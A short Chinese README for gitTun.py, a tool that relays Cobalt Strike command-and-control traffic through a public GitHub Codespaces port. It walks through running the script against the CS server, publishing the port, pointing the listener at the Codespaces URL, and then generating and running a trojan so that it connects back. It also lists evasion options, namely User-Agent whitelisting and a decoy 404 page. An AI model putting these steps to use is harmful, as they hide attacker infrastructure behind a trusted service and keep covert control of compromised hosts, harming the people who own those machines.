# 利用GITHUB CODESPACE进行上线

[![Python 3.x](https://img.shields.io/badge/python-3.x-yellow.svg)](https://www.python.org/) 

## 使用方法
1、CS配置使用profile下的demo.profile.

2、在GIT CODESPACE上，运行代码

```
python gitTun.py -u https://cs_ip:port
```

>这样就会把请求转发到cs上，如果想要看debug信息，可添加`-debug`,如果要添加UA白名单，可添加`-user-agent`参数，并指定UA。可通过`-html` 来指定一个404的页面，端口为要开启的监听器的端口，如：8443。

3、将codespace 上的端口设置为`public`，并指定为HTTPS。

4、将生成的URL作为HOST填入监听器，监听`443`端口，并指定绑定同端口，如 8443。

5、生成木马，运行上线。